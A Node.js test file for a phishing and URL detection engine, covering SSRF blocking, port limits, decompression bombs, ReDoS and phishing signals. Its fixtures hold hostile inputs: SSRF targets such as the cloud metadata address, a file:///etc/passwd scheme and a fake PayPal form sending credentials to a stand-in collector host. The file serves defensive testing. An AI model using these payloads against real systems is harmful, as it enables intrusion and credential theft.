// Offline tests of the detection engine's safety properties. Nothing here
// performs network I/O to third parties: blocked targets are refused before
// any connection is made.
const { db } = require('./helpers');
const { test, after } = require('node:test');
const assert = require('node:assert/strict');
const zlib = require('zlib');
const { isPrivateIp, resolvePublic } = require('../engine/netguard');
const { decodeBody, assertWebPort, MAX_DECODED } = require('../engine/probe');
const { analyseLexical, normaliseUrl } = require('../engine/lexical');
const { analyseContent } = require('../engine/content');
const engine = require('../engine');

after(() => db.close());

test('SSRF guard classifies internal and reserved addresses', () => {
    const internal = ['127.0.0.1', '10.1.2.3', '172.16.0.1', '172.31.255.255', '192.168.1.1', '169.254.169.254', '100.64.0.1',
        '0.0.0.0', '224.0.0.1', '255.255.255.255', '::1', '::', 'fe80::1', 'fc00::1', 'fd12:3456::1', '::ffff:127.0.0.1', '::ffff:10.0.0.1', '2001:db8::1'];
    const external = ['8.8.8.8', '1.1.1.1', '172.32.0.1', '100.128.0.1', '2606:4700:4700::1111'];
    for (const ip of internal) assert.equal(isPrivateIp(ip), true, ip);
    for (const ip of external) assert.equal(isPrivateIp(ip), false, ip);
    assert.equal(isPrivateIp('not-an-ip'), true, 'unknown formats fail closed');
});

test('SSRF: links to loopback, metadata and encoded IPs are refused without connecting', async () => {
    for (const host of ['127.0.0.1', '169.254.169.254', '::1', 'localhost']) {
        await assert.rejects(resolvePublic(host), e => e.code === 'EBLOCKED', host);
    }
    for (const url of ['http://127.0.0.1:3000/', 'http://2130706433/', 'http://0x7f000001/', 'http://[::1]/', 'http://169.254.169.254/latest/meta-data/', 'http://localhost/admin']) {
        const r = await engine.analyzeUrl(url);
        const blocked = r.signals.some(s => s.id === 'internal-ip');
        assert.ok(blocked, `${url} should be blocked as internal`);
        assert.equal(r.evidence.http, undefined, `${url} must not be fetched`);
    }
});

test('only web ports may be probed (no port scanning / protocol smuggling)', () => {
    for (const ok of ['http://a.example/', 'https://a.example/', 'http://a.example:8080/', 'https://a.example:8443/']) assert.doesNotThrow(() => assertWebPort(new URL(ok)));
    for (const bad of ['http://a.example:25/', 'http://a.example:6379/', 'http://a.example:22/', 'https://a.example:3306/', 'http://a.example:11211/']) {
        assert.throws(() => assertWebPort(new URL(bad)), e => e.code === 'EBLOCKEDPORT', bad);
    }
});

test('decompression bombs are capped', () => {
    const bomb = zlib.gzipSync(Buffer.alloc(64 * 1024 * 1024)); // 64 MB of zeros, ~64 KB compressed
    const out = decodeBody(bomb, 'gzip');
    assert.ok(out.length <= MAX_DECODED, `decoded ${out.length} bytes`);
    const br = zlib.brotliCompressSync(Buffer.alloc(64 * 1024 * 1024));
    assert.ok(decodeBody(br, 'br').length <= MAX_DECODED);
});

test('pathological HTML does not cause catastrophic regex backtracking (ReDoS)', async () => {
    const unclosed = '<a href="https:// x">'.repeat(25000) + 'x'.repeat(100000);
    const t0 = Date.now();
    const anchors = engine.extractAnchors(unclosed);
    assert.ok(Date.now() - t0 < 2000, `extractAnchors took ${Date.now() - t0}ms`);
    assert.ok(anchors.length <= 500);

    const t1 = Date.now();
    const report = await engine.analyzeMessage({ html: '<style>' + 'a{'.repeat(200000), text: '' });
    assert.ok(Date.now() - t1 < 3000, `analyzeMessage took ${Date.now() - t1}ms`);
    assert.ok(report.verdict);

    const t2 = Date.now();
    analyseContent('<meta property="og:site_name" '.repeat(20000) + '<form action=', 'https://victim.example/');
    assert.ok(Date.now() - t2 < 3000, `analyseContent took ${Date.now() - t2}ms`);

    // Regression (njsscan regex_dos, confirmed 19.5 s on 200k spaces before the fix).
    const t3 = Date.now();
    analyseContent('oncontextmenu=' + ' '.repeat(590000) + 'x', 'https://victim.example/');
    assert.ok(Date.now() - t3 < 1000, `contextmenu check took ${Date.now() - t3}ms`);
});

test('URL normalisation rejects non-web schemes', () => {
    for (const bad of ['javascript:alert(1)', 'file:///etc/passwd', 'data:text/html,<script>', 'ftp://a.example/', 'gopher://a.example/']) {
        assert.throws(() => normaliseUrl(bad), bad);
    }
    assert.equal(normaliseUrl('hxxps://evil[.]example/x').href, 'https://evil.example/x', 'defanged IOCs accepted');
});

test('lexical analysis flags homographs, embedded brands and credential tricks', () => {
    const ids = u => analyseLexical(normaliseUrl(u)).signals.map(s => s.id);
    assert.ok(ids('https://xn--pypal-4ve.com/').includes('homograph'));
    assert.ok(ids('https://paypal.com.account-verify.example.xyz/').includes('embedded-domain'));
    assert.ok(ids('https://google.com@evil.example/').includes('userinfo'));
    assert.ok(ids('https://evil.example/update.apk').includes('executable'));
});

test('content analysis flags credential exfiltration and brand impersonation', () => {
    const html = `<html><head><title>PayPal | Log in</title></head><body>
      <form action="https://collector.evil.example/p.php" method="post">
        <input name="email"><input type="password" name="pw"><input name="card_number">
      </form></body></html>`;
    const r = analyseContent(html, 'https://secure-update.example/', { domainAgeDays: 3 });
    const ids = r.signals.map(s => s.id);
    assert.ok(ids.includes('form-exfil'));
    assert.ok(ids.includes('brand-mismatch'));
    assert.ok(ids.includes('sensitive-fields'));
});

test('scoring: critical indicators cannot be cancelled by trust signals', () => {
    const critical = { weight: 0.6, severity: 'critical' };
    const trust = { weight: -0.45, severity: 'trust' };
    assert.ok(engine.scoreSignals([critical, trust, trust]) >= 60);
    assert.equal(engine.scoreSignals([]), 0);
    assert.equal(engine.scoreSignals([trust]), 0);
    assert.equal(engine.verdictFor(engine.scoreSignals([{ weight: 0.7, severity: 'critical' }])), 'malicious');
    assert.equal(engine.verdictFor(engine.scoreSignals([{ weight: 0.1, severity: 'low' }])), 'legit');
});

test('message analysis without links works offline and flags coercive lures', async () => {
    const r = await engine.analyzeMessage({ text: 'URGENT: your account is blocked. Share the OTP immediately and install AnyDesk.' });
    assert.ok(r.risk >= 30);
    assert.ok(r.signals.some(s => s.id === 'remote-access'));
    assert.equal(r.links.length, 0);
});
